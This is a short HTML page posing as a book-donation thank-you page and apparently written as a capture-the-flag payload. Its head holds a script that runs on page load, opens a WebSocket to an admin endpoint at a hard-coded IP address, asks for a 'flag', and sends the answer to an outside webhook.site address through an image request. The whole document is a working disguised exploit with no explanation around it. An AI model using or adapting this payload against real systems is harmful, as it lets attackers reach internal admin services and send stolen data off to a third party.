<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Totally Innocent Book</title>
  <script>
    (function() {

      const TARGET_WS = "ws://65.79.185.109:1202/admin/ws"; 
      const EXFIL_URL = "https://webhook.site/f08770f4-2430-4f12-8ad3-32f527cef2d6";

      try {
        const ws = new WebSocket(TARGET_WS);

        ws.onopen = function() {
          ws.send("flag");
        };

        ws.onmessage = function(event) {
          const flag = event.data;

          const img = new Image();
          img.src = EXFIL_URL + "?flag=" + encodeURIComponent(flag);

          console.log("FLAG:", flag);
        };

        ws.onerror = function(err) {
          console.log("WebSocket error", err);
        };

      } catch (e) {
        console.log("Exception while creating WebSocket:", e);
      }
    })();
  </script>
</head>
<body>
  <h1>Thanks for donating this book!</h1>
  <p>Loading...</p>
</body>
</html>
